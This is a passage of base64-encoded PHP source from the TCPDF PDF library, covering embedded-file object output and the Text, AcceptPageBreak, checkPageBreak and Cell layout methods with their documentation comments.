RhdGUgbmFtZSB0cmVlCgkJCQkJJHRoaXMtPmVmbmFtZXNbJGZpbGVuYW1lXSA9ICRmaWxlZGF0YVsnZiddLicgMCBSJzsKCQkJCQkvLyBlbWJlZGRlZCBmaWxlIHNwZWNpZmljYXRpb24gb2JqZWN0CgkJCQkJJG91dCA9ICR0aGlzLT5fZ2V0b2JqKCRmaWxlZGF0YVsnZiddKS4iXG4iOwoJCQkJCSRvdXQgLj0gJzw8L1R5cGUgL0ZpbGVzcGVjIC9GICcuJHRoaXMtPl9kYXRhc3RyaW5nKCRmaWxlbmFtZSwgJGZpbGVkYXRhWydmJ10pOwoJCQkJCSRvdXQgLj0gJyAvVUYgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJGZpbGVuYW1lLCAkZmlsZWRhdGFbJ2YnXSk7CgkJCQkJJG91dCAuPSAnIC9BRlJlbGF0aW9uc2hpcCAvU291cmNlJzsKCQkJCQkkb3V0IC49ICcgL0VGIDw8L0YgJy4kZmlsZWRhdGFbJ24nXS4nIDAgUj4+ID4+JzsKCQkJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCQkJJHRoaXMtPl9vdXQoJG91dCk7CgkJCQkJLy8gZW1iZWRkZWQgZmlsZSBvYmplY3QKCQkJCQkkZmlsdGVyID0gJyc7CgkJCQkJaWYgKCR0aGlzLT5jb21wcmVzcykgewoJCQkJCQkkZGF0YSA9IGd6Y29tcHJlc3MoJGRhdGEpOwoJCQkJCQkkZmlsdGVyID0gJyAvRmlsdGVyIC9GbGF0ZURlY29kZSc7CgkJCQkJfQoKCQkJCQlpZiAoJHRoaXMtPnBkZmFfdmVyc2lvbiA9PSAzKSB7CgkJCQkJCSRmaWx0ZXIgPSAnIC9TdWJ0eXBlIC90ZXh0IzJGeG1sJzsKCQkJCQl9CgoJCQkJCSRzdHJlYW0gPSAkdGhpcy0+X2dldHJhd3N0cmVhbSgkZGF0YSwgJGZpbGVkYXRhWyduJ10pOwoJCQkJCSRvdXQgPSAkdGhpcy0+X2dldG9iaigkZmlsZWRhdGFbJ24nXSkuIlxuIjsKCQkJCQkkb3V0IC49ICc8PCAvVHlwZSAvRW1iZWRkZWRGaWxlJy4kZmlsdGVyLicgL0xlbmd0aCAnLnN0cmxlbigkc3RyZWFtKS4nIC9QYXJhbXMgPDwvU2l6ZSAnLiRyYXdzaXplLic+PiA+Pic7CgkJCQkJJG91dCAuPSAnIHN0cmVhbScuIlxuIi4kc3RyZWFtLiJcbiIuJ2VuZHN0cmVhbSc7CgkJCQkJJG91dCAuPSAiXG4iLidlbmRvYmonOwoJCQkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCQkJfQoJCQl9CgkJfQoJfQoKCS8qKgoJICogUHJpbnRzIGEgdGV4dCBjZWxsIGF0IHRoZSBzcGVjaWZpZWQgcG9zaXRpb24uCgkgKiBUaGlzIG1ldGhvZCBhbGxvd3MgdG8gcGxhY2UgYSBzdHJpbmcgcHJlY2lzZWx5IG9uIHRoZSBwYWdlLgoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHRoZSBjZWxsIG9yaWdpbgoJICogQHBhcmFtIGZsb2F0ICR5IE9yZGluYXRlIG9mIHRoZSBjZWxsIG9yaWdpbgoJICogQHBhcmFtIHN0cmluZyAkdHh0IFN0cmluZyB0byBwcmludAoJICogQHBhcmFtIGludCAkZnN0cm9rZSBvdXRsaW5lIHNpemUgaW4gdXNlciB1bml0cyAoMCA9IGRpc2FibGUpCgkgKiBAcGFyYW0gYm9vbGVhbiAkZmNsaXAgaWYgdHJ1ZSBhY3RpdmF0ZSBjbGlwcGluZyBtb2RlICh5b3UgbXVzdCBjYWxsIFN0YXJ0VHJhbnNmb3JtKCkgYmVmb3JlIHRoaXMgZnVuY3Rpb24gYW5kIFN0b3BUcmFuc2Zvcm0oKSB0byBzdG9wIHRoZSBjbGlwcGluZyB0cmFuZm9ybWF0aW9uKS4KCSAqIEBwYXJhbSBib29sZWFuICRmZmlsbCBpZiB0cnVlIGZpbGxzIHRoZSB0ZXh0CgkgKiBAcGFyYW0gbWl4ZWQgJGJvcmRlciBJbmRpY2F0ZXMgaWYgYm9yZGVycyBtdXN0IGJlIGRyYXduIGFyb3VuZCB0aGUgY2VsbC4gVGhlIHZhbHVlIGNhbiBiZSBhIG51bWJlcjo8dWw+PGxpPjA6IG5vIGJvcmRlciAoZGVmYXVsdCk8L2xpPjxsaT4xOiBmcmFtZTwvbGk+PC91bD4gb3IgYSBzdHJpbmcgY29udGFpbmluZyBzb21lIG9yIGFsbCBvZiB0aGUgZm9sbG93aW5nIGNoYXJhY3RlcnMgKGluIGFueSBvcmRlcik6PHVsPjxsaT5MOiBsZWZ0PC9saT48bGk+VDogdG9wPC9saT48bGk+UjogcmlnaHQ8L2xpPjxsaT5COiBib3R0b208L2xpPjwvdWw+IG9yIGFuIGFycmF5IG9mIGxpbmUgc3R5bGVzIGZvciBlYWNoIGJvcmRlciBncm91cCAtIGZvciBleGFtcGxlOiBhcnJheSgnTFRSQicgPT4gYXJyYXkoJ3dpZHRoJyA9PiAyLCAnY2FwJyA9PiAnYnV0dCcsICdqb2luJyA9PiAnbWl0ZXInLCAnZGFzaCcgPT4gMCwgJ2NvbG9yJyA9PiBhcnJheSgwLCAwLCAwKSkpCgkgKiBAcGFyYW0gaW50ICRsbiBJbmRpY2F0ZXMgd2hlcmUgdGhlIGN1cnJlbnQgcG9zaXRpb24gc2hvdWxkIGdvIGFmdGVyIHRoZSBjYWxsLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+MDogdG8gdGhlIHJpZ2h0IChvciBsZWZ0IGZvciBSVEwgbGFuZ3VhZ2VzKTwvbGk+PGxpPjE6IHRvIHRoZSBiZWdpbm5pbmcgb2YgdGhlIG5leHQgbGluZTwvbGk+PGxpPjI6IGJlbG93PC9saT48L3VsPlB1dHRpbmcgMSBpcyBlcXVpdmFsZW50IHRvIHB1dHRpbmcgMCBhbmQgY2FsbGluZyBMbigpIGp1c3QgYWZ0ZXIuIERlZmF1bHQgdmFsdWU6IDAuCgkgKiBAcGFyYW0gc3RyaW5nICRhbGlnbiBBbGxvd3MgdG8gY2VudGVyIG9yIGFsaWduIHRoZSB0ZXh0LiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+TCBvciBlbXB0eSBzdHJpbmc6IGxlZnQgYWxpZ24gKGRlZmF1bHQgdmFsdWUpPC9saT48bGk+QzogY2VudGVyPC9saT48bGk+UjogcmlnaHQgYWxpZ248L2xpPjxsaT5KOiBqdXN0aWZ5PC9saT48L3VsPgoJICogQHBhcmFtIGJvb2xlYW4gJGZpbGwgSW5kaWNhdGVzIGlmIHRoZSBjZWxsIGJhY2tncm91bmQgbXVzdCBiZSBwYWludGVkICh0cnVlKSBvciB0cmFuc3BhcmVudCAoZmFsc2UpLgoJICogQHBhcmFtIG1peGVkICRsaW5rIFVSTCBvciBpZGVudGlmaWVyIHJldHVybmVkIGJ5IEFkZExpbmsoKS4KCSAqIEBwYXJhbSBpbnQgJHN0cmV0Y2ggZm9udCBzdHJldGNoIG1vZGU6IDx1bD48bGk+MCA9IGRpc2FibGVkPC9saT48bGk+MSA9IGhvcml6b250YWwgc2NhbGluZyBvbmx5IGlmIHRleHQgaXMgbGFyZ2VyIHRoYW4gY2VsbCB3aWR0aDwvbGk+PGxpPjIgPSBmb3JjZWQgaG9yaXpvbnRhbCBzY2FsaW5nIHRvIGZpdCBjZWxsIHdpZHRoPC9saT48bGk+MyA9IGNoYXJhY3RlciBzcGFjaW5nIG9ubHkgaWYgdGV4dCBpcyBsYXJnZXIgdGhhbiBjZWxsIHdpZHRoPC9saT48bGk+NCA9IGZvcmNlZCBjaGFyYWN0ZXIgc3BhY2luZyB0byBmaXQgY2VsbCB3aWR0aDwvbGk+PC91bD4gR2VuZXJhbCBmb250IHN0cmV0Y2hpbmcgYW5kIHNjYWxpbmcgdmFsdWVzIHdpbGwgYmUgcHJlc2VydmVkIHdoZW4gcG9zc2libGUuCgkgKiBAcGFyYW0gYm9vbGVhbiAkaWdub3JlX21pbl9oZWlnaHQgaWYgdHJ1ZSBpZ25vcmUgYXV0b21hdGljIG1pbmltdW0gaGVpZ2h0IHZhbHVlLgoJICogQHBhcmFtIHN0cmluZyAkY2FsaWduIGNlbGwgdmVydGljYWwgYWxpZ25tZW50IHJlbGF0aXZlIHRvIHRoZSBzcGVjaWZpZWQgWSB2YWx1ZS4gUG9zc2libGUgdmFsdWVzIGFyZTo8dWw+PGxpPlQgOiBjZWxsIHRvcDwvbGk+PGxpPkEgOiBmb250IHRvcDwvbGk+PGxpPkwgOiBmb250IGJhc2VsaW5lPC9saT48bGk+RCA6IGZvbnQgYm90dG9tPC9saT48bGk+QiA6IGNlbGwgYm90dG9tPC9saT48L3VsPgoJICogQHBhcmFtIHN0cmluZyAkdmFsaWduIHRleHQgdmVydGljYWwgYWxpZ25tZW50IGluc2lkZSB0aGUgY2VsbC4gUG9zc2libGUgdmFsdWVzIGFyZTo8dWw+PGxpPlQgOiB0b3A8L2xpPjxsaT5DIDogY2VudGVyPC9saT48bGk+QiA6IGJvdHRvbTwvbGk+PC91bD4KCSAqIEBwYXJhbSBib29sZWFuICRydGxvZmYgaWYgdHJ1ZSB1c2VzIHRoZSBwYWdlIHRvcC1sZWZ0IGNvcm5lciBhcyBvcmlnaW4gb2YgYXhpcyBmb3IgJHggYW5kICR5IGluaXRpYWwgcG9zaXRpb24uCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS4wCgkgKiBAc2VlIENlbGwoKSwgV3JpdGUoKSwgTXVsdGlDZWxsKCksIFdyaXRlSFRNTCgpLCBXcml0ZUhUTUxDZWxsKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFRleHQoJHgsICR5LCAkdHh0LCAkZnN0cm9rZT0wLCAkZmNsaXA9ZmFsc2UsICRmZmlsbD10cnVlLCAkYm9yZGVyPTAsICRsbj0wLCAkYWxpZ249JycsICRmaWxsPWZhbHNlLCAkbGluaz0nJywgJHN0cmV0Y2g9MCwgJGlnbm9yZV9taW5faGVpZ2h0PWZhbHNlLCAkY2FsaWduPSdUJywgJHZhbGlnbj0nTScsICRydGxvZmY9ZmFsc2UpIHsKCQkkdGV4dHJlbmRlcm1vZGUgPSAkdGhpcy0+dGV4dHJlbmRlcm1vZGU7CgkJJHRleHRzdHJva2V3aWR0aCA9ICR0aGlzLT50ZXh0c3Ryb2tld2lkdGg7CgkJJHRoaXMtPnNldFRleHRSZW5kZXJpbmdNb2RlKCRmc3Ryb2tlLCAkZmZpbGwsICRmY2xpcCk7CgkJJHRoaXMtPnNldFhZKCR4LCAkeSwgJHJ0bG9mZik7CgkJJHRoaXMtPkNlbGwoMCwgMCwgJHR4dCwgJGJvcmRlciwgJGxuLCAkYWxpZ24sICRmaWxsLCAkbGluaywgJHN0cmV0Y2gsICRpZ25vcmVfbWluX2hlaWdodCwgJGNhbGlnbiwgJHZhbGlnbik7CgkJLy8gcmVzdG9yZSBwcmV2aW91cyByZW5kZXJpbmcgbW9kZQoJCSR0aGlzLT50ZXh0cmVuZGVybW9kZSA9ICR0ZXh0cmVuZGVybW9kZTsKCQkkdGhpcy0+dGV4dHN0cm9rZXdpZHRoID0gJHRleHRzdHJva2V3aWR0aDsKCX0KCgkvKioKCSAqIFdoZW5ldmVyIGEgcGFnZSBicmVhayBjb25kaXRpb24gaXMgbWV0LCB0aGUgbWV0aG9kIGlzIGNhbGxlZCwgYW5kIHRoZSBicmVhayBpcyBpc3N1ZWQgb3Igbm90IGRlcGVuZGluZyBvbiB0aGUgcmV0dXJuZWQgdmFsdWUuCgkgKiBUaGUgZGVmYXVsdCBpbXBsZW1lbnRhdGlvbiByZXR1cm5zIGEgdmFsdWUgYWNjb3JkaW5nIHRvIHRoZSBtb2RlIHNlbGVjdGVkIGJ5IFNldEF1dG9QYWdlQnJlYWsoKS48YnIgLz4KCSAqIFRoaXMgbWV0aG9kIGlzIGNhbGxlZCBhdXRvbWF0aWNhbGx5IGFuZCBzaG91bGQgbm90IGJlIGNhbGxlZCBkaXJlY3RseSBieSB0aGUgYXBwbGljYXRpb24uCgkgKiBAcmV0dXJuIGJvb2wKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjQKCSAqIEBzZWUgU2V0QXV0b1BhZ2VCcmVhaygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBBY2NlcHRQYWdlQnJlYWsoKSB7CgkJaWYgKCR0aGlzLT5udW1fY29sdW1ucyA+IDEpIHsKCQkJLy8gbXVsdGkgY29sdW1uIG1vZGUKCQkJaWYgKCR0aGlzLT5jdXJyZW50X2NvbHVtbiA8ICgkdGhpcy0+bnVtX2NvbHVtbnMgLSAxKSkgewoJCQkJLy8gZ28gdG8gbmV4dCBjb2x1bW4KCQkJCSR0aGlzLT5zZWxlY3RDb2x1bW4oJHRoaXMtPmN1cnJlbnRfY29sdW1uICsgMSk7CgkJCX0gZWxzZWlmICgkdGhpcy0+QXV0b1BhZ2VCcmVhaykgewoJCQkJLy8gYWRkIGEgbmV3IHBhZ2UKCQkJCSR0aGlzLT5BZGRQYWdlKCk7CgkJCQkvLyBzZXQgZmlyc3QgY29sdW1uCgkJCQkkdGhpcy0+c2VsZWN0Q29sdW1uKDApOwoJCQl9CgkJCS8vIGF2b2lkIHBhZ2UgYnJlYWtpbmcgZnJvbSBjaGVja1BhZ2VCcmVhaygpCgkJCXJldHVybiBmYWxzZTsKCQl9CgkJcmV0dXJuICR0aGlzLT5BdXRvUGFnZUJyZWFrOwoJfQoKCS8qKgoJICogQWRkIHBhZ2UgaWYgbmVlZGVkLgoJICogQHBhcmFtIGZsb2F0ICRoIENlbGwgaGVpZ2h0LiBEZWZhdWx0IHZhbHVlOiAwLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgc3RhcnRpbmcgeSBwb3NpdGlvbiwgbGVhdmUgZW1wdHkgZm9yIGN1cnJlbnQgcG9zaXRpb24uCgkgKiBAcGFyYW0gYm9vbCAgJGFkZHBhZ2UgaWYgdHJ1ZSBhZGQgYSBwYWdlLCBvdGhlcndpc2Ugb25seSByZXR1cm4gdGhlIHRydWUvZmFsc2Ugc3RhdGUKCSAqIEByZXR1cm4gYm9vbCB0cnVlIGluIGNhc2Ugb2YgcGFnZSBicmVhaywgZmFsc2Ugb3RoZXJ3aXNlLgoJICogQHNpbmNlIDMuMi4wMDAgKDIwMDgtMDctMDEpCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBjaGVja1BhZ2VCcmVhaygkaD0wLCAkeT1udWxsLCAkYWRkcGFnZT10cnVlKSB7CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCR5KSkgewoJCQkkeSA9ICR0aGlzLT55OwoJCX0KCQkkY3VycmVudF9wYWdlID0gJHRoaXMtPnBhZ2U7CgkJaWYgKCgoJHkgKyAkaCkgPiAkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlcikgQU5EICgkdGhpcy0+aW5QYWdlQm9keSgpKSBBTkQgKCR0aGlzLT5BY2NlcHRQYWdlQnJlYWsoKSkpIHsKCQkJaWYgKCRhZGRwYWdlKSB7CgkJCQkvL0F1dG9tYXRpYyBwYWdlIGJyZWFrCgkJCQkkeCA9ICR0aGlzLT54OwoJCQkJJHRoaXMtPkFkZFBhZ2UoJHRoaXMtPkN1ck9yaWVudGF0aW9uKTsKCQkJCSR0aGlzLT55ID0gJHRoaXMtPnRNYXJnaW47CgkJCQkkb2xkcGFnZSA9ICR0aGlzLT5wYWdlIC0gMTsKCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJaWYgKCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnb3JtJ10gIT0gJHRoaXMtPnBhZ2VkaW1bJG9sZHBhZ2VdWydvcm0nXSkgewoJCQkJCQkkdGhpcy0+eCA9ICR4IC0gKCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnb3JtJ10gLSAkdGhpcy0+cGFnZWRpbVskb2xkcGFnZV1bJ29ybSddKTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhpcy0+eCA9ICR4OwoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJaWYgKCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnb2xtJ10gIT0gJHRoaXMtPnBhZ2VkaW1bJG9sZHBhZ2VdWydvbG0nXSkgewoJCQkJCQkkdGhpcy0+eCA9ICR4ICsgKCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnb2xtJ10gLSAkdGhpcy0+cGFnZWRpbVskb2xkcGFnZV1bJ29sbSddKTsKCQkJCQl9IGVsc2UgewoJCQkJCQkkdGhpcy0+eCA9ICR4OwoJCQkJCX0KCQkJCX0KCQkJfQoJCQlyZXR1cm4gdHJ1ZTsKCQl9CgkJaWYgKCRjdXJyZW50X3BhZ2UgIT0gJHRoaXMtPnBhZ2UpIHsKCQkJLy8gYWNjb3VudCBmb3IgY29sdW1ucyBtb2RlCgkJCXJldHVybiB0cnVlOwoJCX0KCQlyZXR1cm4gZmFsc2U7Cgl9CgoJLyoqCgkgKiBQcmludHMgYSBjZWxsIChyZWN0YW5ndWxhciBhcmVhKSB3aXRoIG9wdGlvbmFsIGJvcmRlcnMsIGJhY2tncm91bmQgY29sb3IgYW5kIGNoYXJhY3RlciBzdHJpbmcuIFRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgY2VsbCBjb3JyZXNwb25kcyB0byB0aGUgY3VycmVudCBwb3NpdGlvbi4gVGhlIHRleHQgY2FuIGJlIGFsaWduZWQgb3IgY2VudGVyZWQuIEFmdGVyIHRoZSBjYWxsLCB0aGUgY3VycmVudCBwb3NpdGlvbiBtb3ZlcyB0byB0aGUgcmlnaHQgb3IgdG8gdGhlIG5leHQgbGluZS4gSXQgaXMgcG9zc2libGUgdG8gcHV0IGEgbGluayBvbiB0aGUgdGV4dC48YnIgLz4KCSAqIElmIGF1dG9tYXRpYyBwYWdlIGJyZWFraW5nIGlzIGVuYWJsZWQgYW5kIHRoZSBjZWxsIGdvZXMgYmV5b25kIHRoZSBsaW1pdCwgYSBwYWdlIGJyZWFrIGlzIGRvbmUgYmVmb3JlIG91dHB1dHRpbmcuCgkgKiBAcGFyYW0gZmxvYXQgJHcgQ2VsbCB3aWR0aC4gSWYgMCwgdGhlIGNlbGwgZXh0ZW5kcyB1cCB0byB0aGUgcmlnaHQgbWFyZ2luLgoJICogQHBhcmFtIGZsb2F0ICRoIENlbGwgaGVpZ2h0LiBEZWZhdWx0IHZhbHVlOiAwLgoJICogQHBhcmFtIHN0cmluZyAkdHh0IFN0cmluZyB0byBwcmludC4gRGVmYXVsdCB2YWx1ZTogZW1wdHkgc3RyaW5nLgoJICogQHBhcmFtIG1peGVkICRib3JkZXIgSW5kaWNhdGVzIGlmIGJvcmRlcnMgbXVzdCBiZSBkcmF3biBhcm91bmQgdGhlIGNlbGwuIFRoZSB2YWx1ZSBjYW4gYmUgYSBudW1iZXI6PHVsPjxsaT4wOiBubyBib3JkZXIgKGRlZmF1bHQpPC9saT48bGk+MTogZnJhbWU8L2xpPjwvdWw+IG9yIGEgc3RyaW5nIGNvbnRhaW5pbmcgc29tZSBvciBhbGwgb2YgdGhlIGZvbGxvd2luZyBjaGFyYWN0ZXJzIChpbiBhbnkgb3JkZXIpOjx1bD48bGk+TDogbGVmdDwvbGk+PGxpPlQ6IHRvcDwvbGk+PGxpPlI6IHJpZ2h0PC9saT48bGk+QjogYm90dG9tPC9saT48L3VsPiBvciBhbiBhcnJheSBvZiBsaW5lIHN0eWxlcyBmb3IgZWFjaCBib3JkZXIgZ3JvdXAgLSBmb3IgZXhhbXBsZTogYXJyYXkoJ0xUUkInID0+IGFycmF5KCd3aWR0aCcgPT4gMiwgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoMCwgMCwgMCkpKQoJICogQHBhcmFtIGludCAkbG4gSW5kaWNhdGVzIHdoZXJlIHRoZSBjdXJyZW50IHBvc2l0aW9uIHNob3VsZCBnbyBhZnRlciB0aGUgY2FsbC4gUG9zc2libGUgdmFsdWVzIGFyZTo8dWw+PGxpPjA6IHRvIHRoZSByaWdodCAob3IgbGVmdCBmb3IgUlRMIGxhbmd1YWdlcyk8L2xpPjxsaT4xOiB0byB0aGUgYmVnaW5uaW5nIG9mIHRoZSBuZXh0IGxpbmU8L2xpPjxsaT4yOiBiZWxvdzwvbGk+PC91bD4gUHV0dGluZyAxIGlzIGVxdWl2YWxlbnQgdG8gcHV0dGluZyAwIGFuZCBjYWxsaW5nIExuKCkganVzdCBhZnRlci4gRGVmYXVsdCB2YWx1ZTogMC4KCSAqIEBwYXJhbSBzdHJpbmcgJGFsaWduIEFsbG93cyB0byBjZW50ZXIgb3IgYWxpZ24gdGhlIHRleHQuIFBvc3NpYmxlIHZhbHVlcyBhcmU6PHVsPjxsaT5MIG9yIGVtcHR5IHN0cmluZzogbGVmdCBhbGlnbiAoZGVmYXVsdCB2YWx1ZSk8L2xpPjxsaT5DOiBjZW50ZXI8L2xpPjxsaT5SOiByaWdodCBhbGlnbjwvbGk+PGxpPko6IGp1c3RpZnk8L2xpPjwvdWw+CgkgKiBAcGFyYW0gYm9vbGVhbiAkZmlsbCBJbmRpY2F0ZXMgaWYgdGhlIGNlbGwgYmFja2dyb3VuZCBtdXN0IGJlIHBhaW50ZWQgKHRydWUpIG9yIHRyYW5zcGFyZW50IChmYWxzZSkuCgkgKiBAcGFyYW0gbWl4ZWQgJGxpbmsgVVJMIG9yIGlkZW50aWZpZXIgcmV0dXJuZWQgYnkgQWRkTGluaygpLgoJICogQHBhcmFtIGludCAkc3RyZXRjaCBmb250IHN0cmV0Y2ggbW9kZTogPHVsPjxsaT4wID0gZGlzYWJsZWQ8L2xpPjxsaT4xID0gaG9yaXpvbnRhbCBzY2FsaW5nIG9ubHkgaWYgdGV4dCBpcyBsYXJnZXIgdGhhbiBjZWxsIHdpZHRoPC9saT48bGk+MiA9IGZvcmNlZCBob3Jpem9udGFsIHNjYWxpbmcgdG8gZml0IGNlbGwgd2lkdGg8L2xpPjxsaT4zID0gY2hhcmFjdGVyIHNwYWNpbmcgb25seSBpZiB0ZXh0IGlzIGxhcmdlciB0aGFuIGNlbGwgd2lkdGg8L2xpPjxsaT40ID0gZm9yY2VkIGNoYXJhY3RlciBzcGFjaW5nIHRvIGZpdCBjZWxsIHdpZHRoPC9saT48L3VsPiBHZW5lcmFsIGZvbnQgc3RyZXRjaGluZyBhbmQgc2NhbGluZyB2YWx1ZXMgd2lsbCBiZSBwcmVzZXJ2ZWQgd2hlbiBwb3NzaWJsZS4KCSAqIEBwYXJhbSBib29sZWFuICRpZ25vcmVfbWluX2hlaWdodCBpZiB0cnVlIGlnbm9yZSBhdXRvbWF0aWMgbWluaW11bSBoZWlnaHQgdmFsdWUuCgkgKiBAcGFyYW0gc3RyaW5nICRjYWxpZ24gY2VsbCB2ZXJ0aWNhbCBhbGlnbm1lbnQgcmVsYXRpdmUgdG8gdGhlIHNwZWNpZmllZCBZIHZhbHVlLiBQb3NzaWJsZSB2YWx1ZXMgYXJlOjx1bD48bGk+VCA6IGNlbGwgdG9wPC9saT48bGk+QyA6IGNlbnRlcjwvbGk+PGxpPkIgOiBjZWxsIGJvdHRvbTwvbGk+PGxpPkEgOiBmb250IHRvcDwvbGk+PGxpPkwgOiBmb250IGJhc2VsaW5lPC9saT48bGk+RCA6IGZvbnQgYm90dG9tPC9saT48L3VsPgoJICogQHBhcmFtIHN0cmluZyAkdmFsaWduIHRleHQgdmVydGljYWwgYWxpZ25tZW50IGluc2lkZSB0aGUgY2VsbC4gUG9zc2libGUgdmFsdWVzIGFyZTo8dWw+PGxpPlQgOiB0b3A8L2xpPjxsaT5DIDogY2VudGVyPC9saT48bGk+QiA6IGJvdHRvbTwvbGk+PC91bD4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjAKCSAqIEBzZWUgU2V0Rm9udCgpLCBTZXREcmF3Q29sb3IoKSwgU2V0RmlsbENvbG9yKCksIFNldFRleHRDb2xvcigpLCBTZXRMaW5lV2lkdGgoKSwgQWRkTGluaygpLCBMbigpLCBNdWx0aUNlbGwoKSwgV3JpdGUoKSwgU2V0QXV0b1BhZ2VCcmVhaygpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBDZWxsKCR3LCAkaD0wLCAkdHh0PScnLCAkYm9yZGVyPTAsICRsbj0wLCAkYWxpZ249JycsICRmaWxsPWZhbHNlLCAkbGluaz0nJywgJHN0cmV0Y2g9MCwgJGlnbm9yZV9taW5faGVpZ2h0PWZhbHNlLCAkY2FsaWduPSdUJywgJHZhbGlnbj0nTScpIHsKCQkkcHJldl9jZWxsX21hcmdpbiA9ICR0aGlzLT5jZWxsX21hcmdpbjsKCQkkcHJldl9jZWxsX3BhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nOwoJCSR0aGlzLT5hZGp1c3RDZWxsUGFkZGluZygkYm9yZGVyKTsKCQlpZiAoISRpZ25vcmVfbWluX2hlaWdodCkgewoJCQkkbWluX2NlbGxfaGVpZ2h0ID0gJHRoaXMtPmdldENlbGxIZWlnaHQoJHRoaXMtPkZvbnRTaXplKTsKCQkJaWYgKCRoIDwgJG1pbl9jZWxsX2hlaWdodCkgewoJCQkJJGggPSAkbWluX2NlbGxfaGVpZ2h0OwoJCQl9CgkJfQoJCSR0aGlzLT5jaGVja1BhZ2VCcmVhaygkaCArICR0aGlzLT5jZWxsX21hcmdpblsnVCddICsgJHRoaXMtPmNlbGxfbWFyZ2luWydCJ10pOwoJCS8vIGFwcGx5IHRleHQgc2hhZG93IGlmIGVuYWJsZWQKCQlpZiAoJHRoaXMtPnR4dHNoYWRvd1snZW5hYmxlZCddKSB7CgkJCS8vIHNhdmUgZGF0YQoJCQkkeCA9ICR0aGlzLT54OwoJCQkkeSA9ICR0aGlzLT55OwoJCQkkYmMgPSAkdGhpcy0+Ymdjb2xvcjsKCQkJJGZjID0gJHRoaXMtPmZnY29sb3I7CgkJCSRzYyA9ICR0aGlzLT5zdHJva2Vjb2xvcjsKCQkJJGFscGhhID0gJHRoaXMtPmFscGhhOwoJCQkvLyBwcmludCBzaGFkb3cKCQkJJHRoaXMtPnggKz0gJHRoaXMtPnR4dHNoYWRvd1snZGVwdGhfdyddOwoJCQkkdGhpcy0+eSArPSAkdGhpcy0+dHh0c2hhZG93WydkZXB0aF9oJ107CgkJCSR0aGlzLT5zZXRGaWxsQ29sb3JBcnJheSgkdGhpcy0+dHh0c2hhZG93Wydjb2xvciddKTsKCQkJJHRoaXMtPnNldFRleHRDb2xvckFycmF5KCR0aGlzLT50eHRzaGFkb3dbJ2NvbG9yJ10pOwoJCQkkdGhpcy0+c2V0RHJhd0NvbG9yQXJyYXkoJHRoaXMtPnR4dHNoYWRvd1snY29sb3InXSk7CgkJCWlmICgkdGhpcy0+dHh0c2hhZG93WydvcGFjaXR5J10gIT0gJGFscGhhWydDQSddKSB7CgkJCQkkdGhpcy0+c2V0QWxwaGEoJHRoaXMtPnR4dHNoYWRvd1snb3BhY2l0eSddLCAkdGhpcy0+dHh0c2hhZG93WydibGVuZF9tb2RlJ10pOwoJCQl9CgkJCWlmICgkdGhpcy0+c3RhdGUgPT0gMikgewoJCQkJJHRoaXMtPl9vdXQoJHRoaXMtPmdldENlbGxDb2RlKCR3LCAkaCwgJHR4dCwgJGJvcmRlciwgJGxuLCAkYWxpZ24sICRmaWxsLCAkbGluaywgJHN0cmV0Y2gsIHRydWUsICRjYWxpZ24sICR2YWxpZ24pKTsKCQkJfQoJCQkvL3Jlc3RvcmUgZGF0YQoJCQkkdGhpcy0+eCA9ICR4OwoJCQkkdGhpcy0+eSA9ICR5OwoJCQkkdGhpcy0+c2V0RmlsbENvbG9yQXJyYXkoJGJjKTsKCQkJJHRoaXMtPnNldFRleHRDb2xvckFycmF5KCRmYyk7CgkJCSR0aGlzLT5zZXREcmF3Q29sb3JBcnJheSgkc2MpOwoJCQlpZiAoJHRoaXMtPnR4dHNoYWRvd1snb3BhY2l0eSddICE9ICRhbHBoYVsnQ0EnXSkgewoJCQkJJHRoaXMtPnNldEFscGhhKCRhbHBoYVsnQ0EnXSwgJGFscGhhWydCTSddLCAkYWxwaGFbJ2NhJ10sICRhbHBoYVsnQUlTJ10pOwoJCQl9CgkJfQoJCWlmICgkdGhpcy0+c3RhdGUgPT0gMikgewoJCQkkdGhpcy0+X291dCgkdGhpcy0+Z2V0Q2VsbENvZGUoJHcsICRoLCAkdHh0LCAkYm9yZGVyLCAkbG4sICRhbGlnbiwgJGZpbGwsICRsaW5rLCAkc3RyZXRjaCwgdHJ1ZSwgJGNhbGlnbiwgJHZhbGlnbikpOwoJCX0KCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJHByZXZfY2VsbF9wYWRkaW5nOwoJCSR0aGlzLT5jZWxsX21hcmdpbiA9ICRwcmV2X2NlbGxfbWFyZ2luOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgUERGIHN0cmluZyBjb2RlIHRvIHByaW50IGEgY2VsbCAocmVjdGFuZ3VsYXIgYXJlYSkgd2l0aCBvcHRpb25hbCBib3JkZXJzLCBiYWNrZ3JvdW5kIGNvbG9yIGFuZCBjaGFyYWN0ZXIgc3RyaW5nLiBUaGUgdXBwZXItbGVmdCBjb3JuZXIgb2Yg